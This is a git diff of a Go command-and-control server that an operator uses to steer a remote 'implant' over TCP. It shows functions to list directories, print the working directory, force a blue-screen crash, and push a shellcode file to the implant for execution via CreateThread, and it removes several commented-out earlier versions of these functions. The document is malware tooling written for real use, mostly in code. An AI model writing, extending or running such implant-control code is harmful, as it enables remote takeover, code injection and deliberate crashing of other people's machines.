@@ -47,21 +47,7 @@ L: //Labeled the for loop with L if i need to break it from switch. Faster than 
 		case "pwd":
 			pwd(conn)
 		default:
-			//v1
-			// (*conn).Write([]byte(command))
-			// request := make([]byte, 9000)
-			// read_len, err := (*conn).Read(request)
-			// if read_len == 0 {
-			// 	fmt.Println("[-]Read Length is 0")
-			// 	//(*conn).Close()
-			// 	return
-			// }
-			// if err != nil {
-			// 	//(*conn).Close()
-			// 	return
-			// }
-			// reply := string(request[:read_len])
-			// fmt.Println(reply)
+
 			(*conn).Write([]byte(command))
 
 			// Read the length prefix (4 bytes)
@@ -154,98 +140,6 @@ func bsod(conn *net.Conn) bool { //Works but implant should be running as admin
 // 	(*conn).Write(contents)
 // }
 
-// V1
-// func ls(conn *net.Conn) { //Limit the size of the data sent over the client because it desyncs everything on server end.
-// 	(*conn).Write([]byte("ls\n"))
-// 	request := make([]byte, 99999999) //This looks reasonable. 99MB maybe a bit too much but this should be more than fine for ridiculously large dirs
-// 	read_len, err := (*conn).Read(request)
-// 	if read_len == 0 {
-// 		(*conn).Close()
-// 		fmt.Println("Error")
-// 		return
-// 	}
-// 	if err != nil {
-// 		(*conn).Close()
-// 		fmt.Println("Error")
-// 		return
-// 	}
-// 	reply := string(request[:read_len])
-// 	fmt.Println("\n" + "	SIZE(KB)		" + "MODE		" + "	NAME" + "\n" +
-// 		"	--------		" + "-----		" + "	-----" + "\n" + reply + "\n")
-// }
-
-// V2
-// func ls(conn *net.Conn) {
-// 	(*conn).Write([]byte("ls\n")) // Initial request
-
-// 	chunk := make([]byte, 1024) // Smaller buffer for reading chunks
-// 	fullListing := ""
-
-// 	for {
-// 		readLen, err := (*conn).Read(chunk)
-// 		if err != nil || readLen == 0 {
-// 			(*conn).Close()
-// 			fmt.Println("Error receiving data")
-// 			return
-// 		}
-
-// 		reply := string(chunk[:readLen])
-
-// 		// If "END" is received, the transfer is complete
-// 		if reply == "END" {
-// 			break
-// 		}
-
-// 		// Append received chunk to the full directory listing
-// 		fullListing += reply
-
-// 		// Send acknowledgment to client after receiving each chunk
-// 		(*conn).Write([]byte("ACK\n"))
-// 	}
-
-// 	fmt.Println("\n" + "	SIZE(KB)		" + "MODE		" + "	NAME" + "\n" +
-// 		"	--------		" + "-----		" + "	-----" + "\n" + fullListing + "\n")
-// }
-
-// //V3
-// func ls(conn *net.Conn) {
-// 	(*conn).Write([]byte("ls\n")) // Send command to client
-
-// 	chunk := make([]byte, 1024) // Buffer for receiving chunks
-// 	fullListing := ""
-
-// 	for {
-// 		readLen, err := (*conn).Read(chunk)
-// 		if err != nil {
-// 			(*conn).Close()
-// 			fmt.Println("Error receiving data: ", err)
-// 			return
-// 		}
-
-// 		reply := string(chunk[:readLen])
-
-// 		// If "END" is received, the transfer is complete
-// 		if reply == "END" {
-// 			break
-// 		}
-
-// 		// Append received chunk to the full directory listing
-// 		fullListing += reply
-
-// 		// Send acknowledgment to client after receiving each chunk
-// 		_, writeErr := (*conn).Write([]byte("ACK\n"))
-// 		if writeErr != nil {
-// 			fmt.Println("Error sending ACK: ", writeErr)
-// 			(*conn).Close()
-// 			return
-// 		}
-// 	}
-
-// 	// Print the full directory listing
-// 	fmt.Println("\n" + "	SIZE(KB)		" + "MODE		" + "	NAME" + "\n" +
-// 		"	--------		" + "-----		" + "	-----" + "\n" + fullListing + "\n")
-// }
-
 // v4. It works. Review this thanks to GPT
 func ls(conn *net.Conn) {
 	(*conn).Write([]byte("ls\n"))
@@ -334,54 +228,6 @@ func pwd(conn *net.Conn) {
 	fmt.Println(reply)
 	fmt.Println()
 }
-
-// This transmits over tcp. Will make one that uses http server
-// func load(conn *net.Conn, fileWShellcode string) {
-// 	fmt.Println()
-// 	fmt.Println("[!]Local File Path:" + fileWShellcode)
-// 	file, err := os.ReadFile(fileWShellcode)
-// 	if err != nil {
-// 		fmt.Println("[-]Couldn't read the file on the local machine !")
-// 		return
-// 	}
-// 	fmt.Println("[*]Sending Signal ...")
-// 	(*conn).Write([]byte("barCode\n"))
-// 	buffer := make([]byte, 10000000)
-// 	read_len, err := (*conn).Read(buffer)
-// 	if err != nil {
-// 		fmt.Println("[-]Error Reading From Buffer")
-// 		return
-// 	}
-// 	if read_len <= 1 {
-// 		fmt.Println("[-]Error with length of Buffer")
-// 		return
-// 	}
-// 	bufferSnapped := buffer[:read_len]
-// 	bufferStr := string(bufferSnapped)
-// 	if bufferStr != "OK\n" {
-// 		fmt.Println("[-]Couldn't initate CreateThread")
-// 		return
-// 	}
-// 	fmt.Println("[+]Signal was recieved and acknowledged")
-
-// 	fmt.Println("[*]Sending shellcode")
-// 	(*conn).Write(file)
-// 	read_len, err = (*conn).Read(buffer)
-// 	if err != nil {
-// 		fmt.Println("[-]Error Reading From Buffer")
-// 		return
-// 	}
-// 	if read_len <= 1 {
-// 		fmt.Println("[-]Error with length of Buffer")
-// 		return
-// 	}
-// 	bufferSnapped = buffer[:read_len]
-// 	bufferStr = string(bufferSnapped)
-// 	if bufferStr != "OK\n" {
-// 		fmt.Println("[-]Couldn't send the shellcode")
-// 	}
-// 	fmt.Println("[+]Shellcode sent successfully !")
-// }
 
 func load(conn *net.Conn, fileWShellcode string) {
 	fmt.Println()
